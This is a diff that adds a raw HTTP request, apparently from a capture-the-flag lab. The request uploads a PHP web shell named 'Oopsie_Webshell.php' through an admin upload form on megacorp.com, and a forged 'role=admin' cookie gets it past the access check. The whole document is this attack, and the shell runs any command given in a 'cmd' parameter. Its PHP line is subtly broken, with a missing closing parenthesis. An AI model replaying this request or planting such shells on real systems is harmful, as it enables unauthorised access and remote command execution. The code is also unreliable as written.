@@ -1,0 +1,25 @@
+POST /cdn-cgi/login/admin.php?content=uploads&action=upload HTTP/1.1
+Host: megacorp.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------32849442814296067543189921893
+Content-Length: 402
+Origin: http://megacorp.com
+Connection: keep-alive
+Referer: http://megacorp.com/cdn-cgi/login/admin.php?content=uploads
+Cookie: user=34322; role=admin
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+-----------------------------32849442814296067543189921893
+Content-Disposition: form-data; name="name"
+
+Oopsie_Webshell.php
+-----------------------------32849442814296067543189921893
+Content-Disposition: form-data; name="fileToUpload"; filename="Oopsie_Webshell.php"
+Content-Type: application/x-php
+
+<?php system($_GET['cmd']; ?>
+
